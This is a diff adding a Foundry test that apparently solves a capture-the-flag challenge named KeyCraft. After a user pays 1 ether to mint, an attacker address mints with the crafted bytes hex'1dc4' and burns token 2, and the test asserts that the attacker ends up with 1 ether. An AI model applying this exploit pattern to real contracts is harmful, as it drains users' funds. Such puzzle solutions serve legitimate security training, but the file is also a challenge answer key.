@@ -1,0 +1,42 @@
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.19;
+
+import {Test} from "forge-std/Test.sol";
+import "forge-std/console.sol";
+import "../src/KeyCraft.sol";
+
+contract KC is Test {
+    KeyCraft k;
+    address owner;
+    address user;
+    address attacker;
+
+    function setUp() public {
+        owner = makeAddr("owner");
+        user = makeAddr("user");
+        attacker = 0xC1b0f68C233018d3fAf76adABE5bfD70748d0f50;
+
+        vm.deal(user, 1 ether);
+
+        vm.startPrank(owner);
+        k = new KeyCraft("KeyCraft", "KC");
+        vm.stopPrank();
+
+        vm.startPrank(user);
+        k.mint{value: 1 ether}(hex"dead");
+        vm.stopPrank();
+    }
+
+    function testKeyCraft() public {
+        vm.startPrank(attacker);
+
+        //Solution
+
+		bytes memory b = hex"1dc4";
+		k.mint(b);
+		k.burn(2); 
+
+        vm.stopPrank();
+        assertEq(attacker.balance, 1 ether);
+    }
+}
